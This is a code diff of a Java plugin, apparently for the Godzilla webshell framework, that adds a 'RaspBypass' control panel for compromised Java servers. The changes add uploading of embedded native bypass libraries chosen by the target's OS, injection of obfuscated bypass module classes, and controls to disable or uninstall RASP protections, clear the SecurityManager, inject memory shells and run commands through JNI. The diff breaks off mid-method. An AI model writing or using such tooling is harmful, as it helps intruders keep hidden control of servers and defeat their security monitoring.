@@ -18,6 +18,7 @@ import java.awt.Insets;
 import java.awt.event.ActionEvent;
 import java.io.InputStream;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import javax.swing.BorderFactory;
 import javax.swing.Box;
 import javax.swing.BoxLayout;
@@ -63,12 +64,16 @@ public class RaspBypass implements Plugin {
 
     private JPanel corePanel;
     private JTabbedPane tabbedPane;
+    private JTabbedPane advancedTabs;
+    private JLabel statusLabel;
+    private JButton refreshDiagButton;
 
     private JTextField cmdTextField;
     private JButton execButton;
     private RTextArea resultTextArea;
     private JComboBox<String> bypassMethodCombo;
     private JCheckBox autoDetectCheckBox;
+    private JCheckBox forceSingleCheckBox;
 
     private JComboBox<String> raspTypeCombo;
     private JButton disableRaspButton;
@@ -138,6 +143,14 @@ public class RaspBypass implements Plugin {
         $$$setupUI$$$();
     }
 
+    /** Module / evalFunc text is always UTF-8 (see RaspBypassModule). */
+    private static String utf8(byte[] bytes) {
+        if (bytes == null) {
+            return "";
+        }
+        return new String(bytes, StandardCharsets.UTF_8);
+    }
+
     /** \u9876\u90e8\u5206\u7ec4\uff08\u51f9\u7ebf\u6807\u9898\uff09 */
     private static JPanel titledFormNorth(JComponent inner, String title) {
         JPanel wrap = new JPanel(new BorderLayout());
@@ -197,95 +210,125 @@ public class RaspBypass implements Plugin {
         return row;
     }
 
+
     private void $$$setupUI$$$() {
         this.corePanel = new JPanel(new BorderLayout());
         this.corePanel.setBorder(new EmptyBorder(6, 8, 8, 8));
+
+        JPanel statusBar = new JPanel(new BorderLayout(8, 0));
+        statusBar.setBorder(BorderFactory.createCompoundBorder(
+                BorderFactory.createEtchedBorder(),
+                new EmptyBorder(6, 8, 6, 8)));
+        this.statusLabel = new JLabel("\u72b6\u6001: \u672a\u8bca\u65ad \u2014 \u70b9\u300c\u8bca\u65ad\u300d\u5237\u65b0\u73af\u5883\uff0c\u6216\u76f4\u63a5\u4e00\u952e\u6267\u884c");
+        this.refreshDiagButton = new JButton("\u5237\u65b0\u8bca\u65ad");
+        this.refreshDiagButton.setToolTipText("opsEnvironment + checkRasp");
+        statusBar.add(this.statusLabel, BorderLayout.CENTER);
+        statusBar.add(this.refreshDiagButton, BorderLayout.EAST);
+        this.corePanel.add(statusBar, BorderLayout.NORTH);
 
         this.tabbedPane = new JTabbedPane();
         this.tabbedPane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);
         this.corePanel.add(this.tabbedPane, BorderLayout.CENTER);
 
-        createCommandExecTab();
-        createRaspDisableTab();
-        createMemoryShellTab();
-        createJniTab();
-        createToolsTab();
-    }
-
-    private void createCommandExecTab() {
-        JPanel panel = new JPanel(new BorderLayout(0, 10));
-        panel.setBorder(new EmptyBorder(TAB_INSETS));
-
-        JPanel form = new JPanel();
-        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
-        form.setOpaque(false);
-
         this.bypassMethodCombo = new JComboBox<>(BYPASS_METHODS);
-        this.bypassMethodCombo.setToolTipText(
-            "\u9009\u9879\u6587\u672c\u9700\u4e0e\u670d\u52a1\u7aef RaspBypassModule \u5339\u914d\uff08\u542b\u82f1\u6587\u7247\u6bb5\uff09");
-        form.add(formRow(new JLabel("\u7ed5\u8fc7\u65b9\u5f0f\uff1a"), this.bypassMethodCombo));
-
-        form.add(Box.createVerticalStrut(6));
-        this.autoDetectCheckBox = new JCheckBox(
-            "\u81ea\u52a8\u63a2\u6d4b RASP \u5e76\u4f18\u9009\u6267\u884c\u8def\u5f84\uff08\u8f6f\u964d\u7ea7\u2192\u666e\u901a\u2192\u6df1\u94fe\uff09");
+        this.bypassMethodCombo.setToolTipText("\u9ad8\u7ea7\u5355\u7b56\u7565\u65f6\u4f7f\u7528\uff1b\u4e00\u952e\u6a21\u5f0f\u8d70\u7ba1\u7ebf");
+        this.autoDetectCheckBox = new JCheckBox("\u7ba1\u7ebf Detect\u2192Plan\u2192Exec\u2192Verify\uff08\u63a8\u8350\uff09");
         this.autoDetectCheckBox.setSelected(true);
-        this.autoDetectCheckBox.setAlignmentX(Component.LEFT_ALIGNMENT);
-        this.autoDetectCheckBox.setToolTipText(
-            "\u5f00\u542f\u540e\u5148\u8bd5\u8f6f\u964d\u7ea7\u8def\u5f84\uff0c\u5931\u8d25\u518d\u9012\u8fdb\u6df1\u94fe");
-        form.add(this.autoDetectCheckBox);
-
-        form.add(Box.createVerticalStrut(6));
-        this.cmdTextField = new JTextField();
-        this.cmdTextField.setText("whoami");
-        this.cmdTextField.setToolTipText("\u5728\u76ee\u6807 JVM \u4e0a\u6267\u884c\u7684\u547d\u4ee4\u884c");
-        form.add(formRow(new JLabel("\u547d\u4ee4\uff1a"), this.cmdTextField));
-
-        form.add(Box.createVerticalStrut(8));
-        this.execButton = new JButton("\u6267\u884c");
-        form.add(leftFlowRow(this.execButton));
-
-        panel.add(titledFormNorth(form, "\u547d\u4ee4\u6267\u884c\u53c2\u6570"), BorderLayout.NORTH);
-
+        this.forceSingleCheckBox = new JCheckBox("\u5f3a\u5236\u5355\u7b56\u7565\uff08\u7528\u4e0b\u62c9\uff09");
+        this.forceSingleCheckBox.setSelected(false);
+        this.cmdTextField = new JTextField("whoami");
+        this.execButton = new JButton("\u4e00\u952e\u6267\u884c");
         this.resultTextArea = new RTextArea();
-        mountOutputPane(panel, this.resultTextArea);
+        this.raspResultTextArea = new RTextArea();
+        this.memShellResultTextArea = new RTextArea();
+        this.jniResultTextArea = new RTextArea();
+        this.toolsResultTextArea = new RTextArea();
 
-        this.tabbedPane.addTab("\u547d\u4ee4\u6267\u884c", (Icon) null, panel, null);
+        createDiagnoseTab();
+        createOneClickTab();
+        createAdvancedTab();
+        this.tabbedPane.setSelectedIndex(1);
     }
 
-    private void createRaspDisableTab() {
+    private void createDiagnoseTab() {
         JPanel panel = new JPanel(new BorderLayout(0, 10));
         panel.setBorder(new EmptyBorder(TAB_INSETS));
-
         JPanel form = new JPanel();
         form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
         form.setOpaque(false);
+        this.opsEnvironmentButton = new JButton("\u73af\u5883\u6307\u7eb9 + PLAN");
+        this.checkRaspButton = new JButton("\u68c0\u67e5 RASP \u5382\u5546");
+        JButton smartAdvisorButton = new JButton("\u667a\u80fd\u5efa\u8bae");
+        smartAdvisorButton.addActionListener(e -> smartAdvisorButtonClick(e));
+        form.add(leftFlowRow(this.opsEnvironmentButton, this.checkRaspButton, smartAdvisorButton));
+        form.add(Box.createVerticalStrut(8));
+        JLabel hint = new JLabel("<html>\u8bca\u65ad\u53ea\u8bfb\u53d6\u73af\u5883\uff0c\u4e0d\u6267\u884c\u5371\u9669\u547d\u4ee4\u3002\u5b8c\u6210\u540e\u5230\u300c\u4e00\u952e\u6267\u884c\u300d\u3002Disable/\u5185\u5b58\u9a6c\u5728\u300c\u9ad8\u7ea7\u300d\u3002</html>");
+        hint.setAlignmentX(Component.LEFT_ALIGNMENT);
+        form.add(hint);
+        panel.add(titledFormNorth(form, "\u8bca\u65ad\u4e0e\u89c4\u5212"), BorderLayout.NORTH);
+        mountOutputPane(panel, this.raspResultTextArea);
+        this.tabbedPane.addTab("\u8bca\u65ad", (Icon) null, panel, "Detect + Plan");
+    }
 
+    private void createOneClickTab() {
+        JPanel panel = new JPanel(new BorderLayout(0, 10));
+        panel.setBorder(new EmptyBorder(TAB_INSETS));
+        JPanel form = new JPanel();
+        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
+        form.setOpaque(false);
+        this.autoDetectCheckBox.setAlignmentX(Component.LEFT_ALIGNMENT);
+        this.forceSingleCheckBox.setAlignmentX(Component.LEFT_ALIGNMENT);
+        form.add(this.autoDetectCheckBox);
+        form.add(Box.createVerticalStrut(4));
+        form.add(this.forceSingleCheckBox);
+        form.add(Box.createVerticalStrut(6));
+        form.add(formRow(new JLabel("\u5355\u7b56\u7565\uff08\u4ec5\u5f3a\u5236\u65f6\uff09\uff1a"), this.bypassMethodCombo));
+        form.add(Box.createVerticalStrut(6));
+        form.add(formRow(new JLabel("\u547d\u4ee4\uff1a"), this.cmdTextField));
+        form.add(Box.createVerticalStrut(8));
+        form.add(leftFlowRow(this.execButton));
+        panel.add(titledFormNorth(form, "Detect \u2192 Plan \u2192 Exec \u2192 Verify"), BorderLayout.NORTH);
+        mountOutputPane(panel, this.resultTextArea);
+        this.tabbedPane.addTab("\u4e00\u952e\u6267\u884c", (Icon) null, panel, "Pipeline");
+    }
+
+    private void createAdvancedTab() {
+        this.advancedTabs = new JTabbedPane();
+        this.advancedTabs.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);
+        this.advancedTabs.addTab("RASP \u7981\u7528", createRaspDisablePanel());
+        this.advancedTabs.addTab("\u5185\u5b58\u9a6c", createMemoryShellPanel());
+        this.advancedTabs.addTab("JNI", createJniPanel());
+        this.advancedTabs.addTab("\u5de5\u5177", createToolsPanel());
+        JPanel wrap = new JPanel(new BorderLayout());
+        wrap.setBorder(new EmptyBorder(4, 4, 4, 4));
+        wrap.add(this.advancedTabs, BorderLayout.CENTER);
+        this.tabbedPane.addTab("\u9ad8\u7ea7", (Icon) null, wrap, "Disable / Memshell / JNI / Tools");
+    }
+
+    private JPanel createRaspDisablePanel() {
+        JPanel panel = new JPanel(new BorderLayout(0, 10));
+        panel.setBorder(new EmptyBorder(TAB_INSETS));
+        JPanel form = new JPanel();
+        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
+        form.setOpaque(false);
         this.raspTypeCombo = new JComboBox<>(RASP_TYPES);
-        this.raspTypeCombo.setToolTipText(
-            "OpenRASP / JRASP \u7b49\u5b57\u7b26\u4e32\u7528\u4e8e\u670d\u52a1\u7aef\u5206\u652f\u903b\u8f91");
         form.add(formRow(new JLabel("RASP \u7c7b\u578b\uff1a"), this.raspTypeCombo));
-
         form.add(Box.createVerticalStrut(6));
         JPanel radioPanel = new JPanel();
         radioPanel.setLayout(new BoxLayout(radioPanel, BoxLayout.Y_AXIS));
         radioPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
         radioPanel.setOpaque(false);
         radioPanel.setBorder(BorderFactory.createCompoundBorder(
-            BorderFactory.createTitledBorder(
-                BorderFactory.createEtchedBorder(),
-                "\u64cd\u4f5c\u6a21\u5f0f"),
-            new EmptyBorder(4, 6, 6, 6)));
-
-        this.disableHookRadio = new JRadioButton("\u5173\u95ed Hook \u5f00\u5173");
+                BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(), "\u64cd\u4f5c\u6a21\u5f0f"),
+                new EmptyBorder(4, 6, 6, 6)));
+        this.disableHookRadio = new JRadioButton("\u5173\u95ed Hook");
         this.disableHookRadio.setSelected(true);
-        this.modifyConfigRadio = new JRadioButton("\u4fee\u6539\u914d\u7f6e\u9879");
-        this.uninstallRadio = new JRadioButton("\u5378\u8f7d RASP \u63a2\u9488");
-
+        this.modifyConfigRadio = new JRadioButton("\u4fee\u6539\u914d\u7f6e");
+        this.uninstallRadio = new JRadioButton("\u5378\u8f7d\u63a2\u9488");
         ButtonGroup group = new ButtonGroup();
         group.add(this.disableHookRadio);
         group.add(this.modifyConfigRadio);
         group.add(this.uninstallRadio);
-
         this.disableHookRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
         this.modifyConfigRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
         this.uninstallRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
@@ -295,135 +338,85 @@ public class RaspBypass implements Plugin {
         radioPanel.add(Box.createVerticalStrut(4));
         radioPanel.add(this.uninstallRadio);
         form.add(radioPanel);
-
         form.add(Box.createVerticalStrut(8));
-        this.checkRaspButton = new JButton("\u68c0\u67e5 RASP \u72b6\u6001");
         this.disableRaspButton = new JButton("\u7981\u7528 RASP");
-        this.universalDisableButton = new JButton("\u901a\u7528\u7981\u7528\uff08\u591a\u8def\u5c1d\u8bd5\uff09");
+        this.universalDisableButton = new JButton("\u901a\u7528\u7981\u7528");
         this.uninstallRaspButton = new JButton("\u5378\u8f7d RASP");
         this.clearSecurityManagerButton = new JButton("\u6e05\u9664 SecurityManager");
-        this.opsEnvironmentButton = new JButton("\u4e3b\u673a/\u73af\u5883\u6307\u7eb9");
-
-        JPanel btnGrid = new JPanel(new GridLayout(3, 2, GAP, GAP));
+        JPanel btnGrid = new JPanel(new GridLayout(2, 2, GAP, GAP));
         btnGrid.setAlignmentX(Component.LEFT_ALIGNMENT);
-        btnGrid.setMaximumSize(new Dimension(Integer.MAX_VALUE, 140));
-        btnGrid.setBorder(BorderFactory.createCompoundBorder(
-            BorderFactory.createTitledBorder(
-                BorderFactory.createEtchedBorder(),
-                "\u5feb\u6377\u6309\u94ae"),
-            new EmptyBorder(4, 6, 6, 6)));
-        btnGrid.add(this.checkRaspButton);
+        btnGrid.setMaximumSize(new Dimension(Integer.MAX_VALUE, 100));
         btnGrid.add(this.disableRaspButton);
         btnGrid.add(this.universalDisableButton);
         btnGrid.add(this.uninstallRaspButton);
         btnGrid.add(this.clearSecurityManagerButton);
-        btnGrid.add(this.opsEnvironmentButton);
         form.add(btnGrid);
-        
-        form.add(Box.createVerticalStrut(8));
-        JButton smartAdvisorButton = new JButton("智能 RASP/EDR 诊断与推荐面板");
-        smartAdvisorButton.addActionListener(e -> smartAdvisorButtonClick(e));
-        form.add(leftFlowRow(smartAdvisorButton));
-
-        panel.add(titledFormNorth(form, "\u7981\u7528\u4e0e\u68c0\u6d4b"), BorderLayout.NORTH);
-
-        this.raspResultTextArea = new RTextArea();
+        panel.add(titledFormNorth(form, "\u7981\u7528\uff08\u4e0d\u8d70\u81ea\u52a8\u7ba1\u7ebf\uff09"), BorderLayout.NORTH);
         mountOutputPane(panel, this.raspResultTextArea);
-
-        this.tabbedPane.addTab("RASP \u7981\u7528", (Icon) null, panel, null);
+        return panel;
     }
 
-    private void createMemoryShellTab() {
+    private JPanel createMemoryShellPanel() {
         JPanel panel = new JPanel(new BorderLayout(0, 10));
         panel.setBorder(new EmptyBorder(TAB_INSETS));
-
         JPanel form = new JPanel();
         form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
         form.setOpaque(false);
-
         this.memShellTypeCombo = new JComboBox<>(MEM_SHELL_TYPES);
-        this.memShellTypeCombo.setToolTipText("Tomcat Filter \u7b49\u5b57\u7b26\u4e32\u9700\u4e0e\u670d\u52a1\u7aef\u5339\u914d");
-        form.add(formRow(new JLabel("\u5185\u5b58\u9a6c\u7c7b\u578b\uff1a"), this.memShellTypeCombo));
-
+        form.add(formRow(new JLabel("\u7c7b\u578b\uff1a"), this.memShellTypeCombo));
         form.add(Box.createVerticalStrut(6));
         this.memShellPathTextField = new JTextField("/shell");
-        this.memShellPathTextField.setToolTipText("\u5982 /shell \uff0c\u65e0\u524d\u7f00\u659c\u6760");
-        form.add(formRow(new JLabel("URL \u8def\u5f84\uff1a"), this.memShellPathTextField));
-
+        form.add(formRow(new JLabel("URL\uff1a"), this.memShellPathTextField));
         form.add(Box.createVerticalStrut(8));
-        this.injectMemShellButton = new JButton("\u6ce8\u5165\u5185\u5b58\u9a6c");
-        this.removeMemShellButton = new JButton("\u79fb\u9664\u5185\u5b58\u9a6c");
+        this.injectMemShellButton = new JButton("\u6ce8\u5165");
+        this.removeMemShellButton = new JButton("\u79fb\u9664");
         form.add(leftFlowRow(this.injectMemShellButton, this.removeMemShellButton));
-
-        panel.add(titledFormNorth(form, "\u5185\u5b58\u9a6c\u53c2\u6570"), BorderLayout.NORTH);
-
-        this.memShellResultTextArea = new RTextArea();
+        panel.add(titledFormNorth(form, "\u5185\u5b58\u9a6c"), BorderLayout.NORTH);
         mountOutputPane(panel, this.memShellResultTextArea);
-
-        this.tabbedPane.addTab("\u5185\u5b58\u9a6c", (Icon) null, panel, null);
+        return panel;
     }
 
-    private void createJniTab() {
+    private JPanel createJniPanel() {
         JPanel panel = new JPanel(new BorderLayout(0, 10));
         panel.setBorder(new EmptyBorder(TAB_INSETS));
-
         JPanel form = new JPanel();
         form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
         form.setOpaque(false);
-
-        this.jniSoPathTextField = new JTextField("/tmp/evil.so");
-        this.jniSoPathTextField.setToolTipText(
-            "\u53ef\u9009\uff1b\u7559\u7a7a\u65f6\u670d\u52a1\u7aef\u6309\u5185\u7f6e\u540d\u52a0\u8f7d\u539f\u751f\u5e93");
-        form.add(formRow(new JLabel("SO/DLL \u8def\u5f84\uff08\u53ef\u9009\uff09\uff1a"), this.jniSoPathTextField));
-
+        this.jniSoPathTextField = new JTextField("");
+        this.jniSoPathTextField.setToolTipText("\u53ef\u7a7a\uff1b\u7a7a\u5219\u670d\u52a1\u7aef\u6309\u5185\u7f6e\u540d\u52a0\u8f7d");
+        form.add(formRow(new JLabel("SO/DLL\uff1a"), this.jniSoPathTextField));
         form.add(Box.createVerticalStrut(4));
-        this.loadJniButton = new JButton("\u52a0\u8f7d JNI \u5e93");
-        this.loadJniButton.setToolTipText("\u5148\u52a0\u8f7d\u518d\u6267\u884c\uff1b\u5df2\u5728\u5176\u4ed6 ClassLoader \u52a0\u8f7d\u8fc7\u540c\u540d\u5e93\u4f1a\u62a5\u9519");
+        this.loadJniButton = new JButton("\u52a0\u8f7d JNI");
         form.add(leftFlowRow(this.loadJniButton));
-
         form.add(Box.createVerticalStrut(8));
         this.jniCmdTextField = new JTextField("id");
-        this.jniCmdTextField.setToolTipText("\u901a\u8fc7 JNI \u5728\u76ee\u6807\u8fdb\u7a0b\u5185\u6267\u884c");
         form.add(formRow(new JLabel("\u547d\u4ee4\uff1a"), this.jniCmdTextField));
-
         form.add(Box.createVerticalStrut(8));
-        this.execJniButton = new JButton("JNI \u6267\u884c\u547d\u4ee4");
+        this.execJniButton = new JButton("JNI \u6267\u884c");
         form.add(leftFlowRow(this.execJniButton));
-
-        panel.add(titledFormNorth(form, "JNI \u914d\u7f6e"), BorderLayout.NORTH);
-
-        this.jniResultTextArea = new RTextArea();
+        panel.add(titledFormNorth(form, "JNI"), BorderLayout.NORTH);
         mountOutputPane(panel, this.jniResultTextArea);
-
-        this.tabbedPane.addTab("JNI \u7ed5\u8fc7", (Icon) null, panel, null);
+        return panel;
     }
 
-    private void createToolsTab() {
+    private JPanel createToolsPanel() {
         JPanel panel = new JPanel(new BorderLayout(0, 10));
         panel.setBorder(new EmptyBorder(TAB_INSETS));
-
         JPanel form = new JPanel();
         form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
         form.setOpaque(false);
-
         this.sourcePathTextField = new JTextField("/bin/bash");
-        form.add(formRow(new JLabel("\u6e90\u8def\u5f84\uff1a"), this.sourcePathTextField));
-
+        form.add(formRow(new JLabel("\u6e90\uff1a"), this.sourcePathTextField));
         form.add(Box.createVerticalStrut(6));
         this.destPathTextField = new JTextField("/tmp/glassy");
-        form.add(formRow(new JLabel("\u76ee\u6807\u8def\u5f84\uff1a"), this.destPathTextField));
-
+        form.add(formRow(new JLabel("\u76ee\u6807\uff1a"), this.destPathTextField));
         form.add(Box.createVerticalStrut(8));
         this.copyBashButton = new JButton("\u590d\u5236\u4e8c\u8fdb\u5236");
-        this.createLinkButton = new JButton("\u521b\u5efa\u7b26\u53f7\u94fe\u63a5");
+        this.createLinkButton = new JButton("\u7b26\u53f7\u94fe\u63a5");
         form.add(leftFlowRow(this.copyBashButton, this.createLinkButton));
-
-        panel.add(titledFormNorth(form, "\u8def\u5f84\u4e0e\u64cd\u4f5c"), BorderLayout.NORTH);
-
-        this.toolsResultTextArea = new RTextArea();
+        panel.add(titledFormNorth(form, "\u8def\u5f84\u5de5\u5177"), BorderLayout.NORTH);
         mountOutputPane(panel, this.toolsResultTextArea);
-
-        this.tabbedPane.addTab("\u8f85\u52a9\u5de5\u5177", (Icon) null, panel, null);
+        return panel;
     }
 
     public JComponent $$$getRootComponent$$$() {
@@ -435,6 +428,43 @@ public class RaspBypass implements Plugin {
         this.shellEntity = shellEntity;
         this.payload = shellEntity.getPayloadModule();
         automaticBindClick.bindJButtonClick(this, this);
+        if (this.refreshDiagButton != null) {
+            this.refreshDiagButton.addActionListener(e -> refreshDiagButtonClick(e));
+        }
+        updateStatusBar("\u5c31\u7eea\uff08\u672a\u8bca\u65ad\uff09");
+    }
+
+    private void updateStatusBar(String msg) {
+        if (this.statusLabel != null) {
+            this.statusLabel.setText("\u72b6\u6001: " + msg);
+        }
+    }
+
+    private void refreshDiagButtonClick(ActionEvent event) {
+        if (this.tabbedPane != null) {
+            this.tabbedPane.setSelectedIndex(0);
+        }
+        opsEnvironmentButtonClick(event);
+    }
+
+    private void applyPipelineMetaToStatus(String strResult) {
+        if (strResult == null) {
+            return;
+        }
+        int meta = strResult.lastIndexOf("<!--RASP_META:");
+        if (meta < 0) {
+            return;
+        }
+        int endMeta = strResult.indexOf("-->", meta);
+        if (endMeta < 0) {
+            return;
+        }
+        String body = strResult.substring(meta + "<!--RASP_META:".length(), endMeta).trim();
+        String summary = body.replace('{', ' ').replace('}', ' ').replace('"', ' ').trim();
+        if (summary.length() > 160) {
+            summary = summary.substring(0, 160) + "...";
+        }
+        updateStatusBar(summary);
     }
 
     @Override
@@ -442,17 +472,153 @@ public class RaspBypass implements Plugin {
         return this.corePanel;
     }
 
-    private InputStream openRaspBypassModuleResource() {
-        InputStream in = getClass().getResourceAsStream("assets/RaspBypassModule.classs");
-        if (in != null) {
-            return in;
+
+    /** Read embedded rasp_bypass_*.dll/so for upload to target. */
+    private byte[] readEmbeddedNativeLib() {
+        String os = System.getProperty("os.name", "").toLowerCase();
+        String name;
+        if (os.contains("win")) {
+            name = "rasp_bypass_win_x64.dll";
+        } else if (os.contains("mac") || os.contains("darwin")) {
+            name = "rasp_bypass_mac.so";
+        } else {
+            name = "rasp_bypass_linux_x64.so";
         }
-        java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
-        if (cl != null) {
-            in = cl.getResourceAsStream("shells/plugins/java/assets/RaspBypassModule.classs");
+        InputStream in = openPluginAsset(name.replace(".dll", "").replace(".so", ""));
+        // openPluginAsset appends .classs/.class \u2014 use direct resource for dll
+        in = getClass().getResourceAsStream("assets/" + name);
+        if (in == null) {
+            java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
+            if (cl != null) {
+                in = cl.getResourceAsStream("shells/plugins/java/assets/" + name);
+            }
+        }
+        if (in == null) {
+            return null;
+        }
+        try {
+            return functions.readInputStreamAutoClose(in);
+        } catch (Exception e) {
+            Log.error(e);
+            return null;
+        }
+    }
+
+    private void attachNativeLibBytes(ReqParameter params) {
+        if (params == null) {
+            return;
+        }
+        // Prefer target OS (shell payload), not the operator workstation OS.
+        byte[] lib = readEmbeddedNativeLibForTarget();
+        if (lib != null && lib.length > 0) {
+            params.add("libBytes", lib);
+            params.add("libName", targetNativeLibName());
+        }
+    }
+
+    private boolean targetIsWindows() {
+        try {
+            if (this.payload != null) {
+                return this.payload.isWindows();
+            }
+        } catch (Throwable ignored) {
+        }
+        return System.getProperty("os.name", "").toLowerCase().contains("win");
+    }
+
+    private boolean targetIsX64() {
+        try {
+            if (this.payload != null) {
+                return this.payload.isX64();
+            }
+        } catch (Throwable ignored) {
+        }
+        String arch = System.getProperty("os.arch", "").toLowerCase();
+        return arch.contains("64") || arch.contains("amd64") || arch.contains("x86_64");
+    }
+
+    private String targetNativeLibName() {
+        if (targetIsWindows()) {
+            return targetIsX64() ? "rasp_bypass_win_x64.dll" : "rasp_bypass_win_x86.dll";
+        }
+        String os = "";
+        try {
+            if (this.payload != null && this.payload.getOsInfo() != null) {
+                os = this.payload.getOsInfo().toLowerCase();
+            }
+        } catch (Throwable ignored) {
+        }
+        if (os.contains("mac") || os.contains("darwin")) {
+            return "rasp_bypass_mac.so";
+        }
+        return targetIsX64() ? "rasp_bypass_linux_x64.so" : "rasp_bypass_linux_x86.so";
+    }
+
+    private byte[] readEmbeddedNativeLibForTarget() {
+        String name = targetNativeLibName();
+        byte[] lib = readEmbeddedNativeByName(name);
+        if (lib != null && lib.length > 0) {
+            return lib;
+        }
+        // fallback chain for missing arch-specific builds
+        if (targetIsWindows()) {
+            return readEmbeddedNativeByName("rasp_bypass_win_x64.dll");
+        }
+        lib = readEmbeddedNativeByName("rasp_bypass_linux_x64.so");
+        if (lib != null) {
+            return lib;
+        }
+        return readEmbeddedNativeLib();
+    }
+
+    private byte[] readEmbeddedNativeByName(String name) {
+        if (name == null || name.isEmpty()) {
+            return null;
+        }
+        InputStream in = getClass().getResourceAsStream("assets/" + name);
+        if (in == null) {
+            java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
+            if (cl != null) {
+                in = cl.getResourceAsStream("shells/plugins/java/assets/" + name);
+            }
+        }
+        if (in == null) {
+            return null;
+        }
+        try {
+            return functions.readInputStreamAutoClose(in);
+        } catch (Exception e) {
+            Log.error(e);
+            return null;
+        }
+    }
+
+    private InputStream openPluginAsset(String fileName) {
+        // Prefer .classs (Godzilla package suffix), then plain .class
+        String[] rel = new String[]{
+                "assets/" + fileName + ".classs",
+                "assets/" + fileName + ".class"
+        };
+        for (String r : rel) {
+            InputStream in = getClass().getResourceAsStream(r);
             if (in != null) {
                 return in;
             }
+            java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
+            if (cl != null) {
+                in = cl.getResourceAsStream("shells/plugins/java/" + r);
+                if (in != null) {
+                    return in;
+                }
+            }
+        }
+        return null;
+    }
+
+    private InputStream openRaspBypassModuleResource() {
+        InputStream in = openPluginAsset("RaspBypassModule");
+        if (in != null) {
+            return in;
         }
         try {
             URL url = getClass().getProtectionDomain() != null && getClass().getProtectionDomain().getCodeSource() != null
@@ -463,6 +629,32 @@ public class RaspBypass implements Plugin {
         } catch (Exception ignored) {
         }
         return null;
+    }
+
+    /** Upload RaspBypassModule$1..$N used by anonymous classes (memshell / threads). */
+    private void includeModuleInners() {
+        for (int i = 1; i <= 16; i++) {
+            String simple = "RaspBypassModule$" + i;
+            InputStream in = openPluginAsset(simple);
+            if (in == null) {
+                if (i == 1) {
+                    // no inners packaged
+                    return;
+                }
+                break;
+            }
+            try {
+                byte[] bytes = functions.readInputStreamAutoClose(in);
+                if (bytes == null || bytes.length == 0) {
+                    continue;
+                }
+                // Do not ASM-rename inners: binary refs from outer class
+                boolean ok = this.payload.include(simple, bytes);
+                Log.log("RaspBypass include inner " + simple + ": " + ok);
+            } catch (Exception e) {
+                Log.error("include inner " + simple + ": " + e.getMessage());
+            }
+        }
     }
 
     private void broadcastModuleHint(String hint) {
@@ -485,16 +677,26 @@ public class RaspBypass implements Plugin {
             return false;
         }
         try {
-            // Class-Loading Caching Optimization: Check if already loaded on target
+            // Prefer lightweight ping; fall back to opsEnvironment for older modules
             try {
-                byte[] testRes = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
-                if (testRes != null && testRes.length > 0) {
-                    Log.log("RaspBypassModule is already cached on target loader.");
+                byte[] testRes = this.payload.evalFunc("RaspBypassModule", "ping", new ReqParameter());
+                String p = testRes == null ? "" : utf8(testRes);
+                if (p.contains("pong") || (testRes != null && testRes.length > 0 && !p.toLowerCase().contains("error"))) {
+                    Log.log("RaspBypassModule is already cached on target loader (ping).");
                     this.moduleReady = true;
                     return true;
                 }
-            } catch (Exception ignored) {
-                // Not cached or error, proceed to upload
+            } catch (Exception ignoredPing) {
+                try {
+                    byte[] testRes = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
+                    if (testRes != null && testRes.length > 0) {
+                        Log.log("RaspBypassModule is already cached on target loader.");
+                        this.moduleReady = true;
+                        return true;
+                    }
+                } catch (Exception ignored) {
+                    // Not cached or error, proceed to upload
+                }
             }
 
             InputStream in = openRaspBypassModuleResource();
@@ -514,12 +716,41 @@ public class RaspBypass implements Plugin {
                 return false;
             }
             
-            // Polymorphic ASM Obfuscation
+            // Polymorphic ASM Obfuscation (outer only; never rename FQN / break inner refs)
             try {
                 moduleBytes = obfuscateModule(moduleBytes);
             } catch (Exception asmEx) {
                 Log.error("ASM Obfuscation failed: " + asmEx.getMessage());
             }
+
+            // Inners first so outer linkage can resolve anonymous classes
+            includeModuleInners();
+            // Helper for native load (optional)
+            try {
+                InputStream loaderIn = openPluginAsset("RaspNativeLoader");
+                if (loaderIn != null) {
+                    byte[] lb = functions.readInputStreamAutoClose(loaderIn);
+                    if (lb != null && lb.length > 0) {
+                        boolean lok = this.payload.include("RaspNativeLoader", lb);
+                        Log.log("RaspNativeLoader include: " + lok);
+                    }
+                }
+            } catch (Exception ex) {
+                Log.error("RaspNativeLoader include: " + ex.getMessage());
+            }
+            try {
+                InputStream planIn = openPluginAsset("RaspDetectPlan");
+                if (planIn != null) {
+                    byte[] pb = functions.readInputStreamAutoClose(planIn);
+                    if (pb != null && pb.length > 0) {
+                        boolean pok = this.payload.include("RaspDetectPlan", pb);
+                        Log.log("RaspDetectPlan include: " + pok);
+                    }
+                }
+            } catch (Exception ex) {
+                Log.error("RaspDetectPlan include: " + ex.getMessage());
+            }
+
 
             this.moduleReady = this.payload.include("RaspBypassModule", moduleBytes);
             Log.log("RaspBypassModule include: " + this.moduleReady);
@@ -571,33 +802,33 @@ public class RaspBypass implements Plugin {
     
     private void smartAdvisorButtonClick(ActionEvent event) {
         if (!loadModule()) {
-            this.raspResultTextArea.append("模块未加载，无法执行智能分析！\n");
+            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff0c\u65e0\u6cd5\u6267\u884c\u667a\u80fd\u5206\u6790\uff01\n");
             return;
         }
         
         this.raspResultTextArea.append("========================================\n");
-        this.raspResultTextArea.append("启动智能 RASP/EDR 诊断与建议引擎...\n");
-        this.raspResultTextArea.append("分析环境变量、进程指纹及已注入代理...\n");
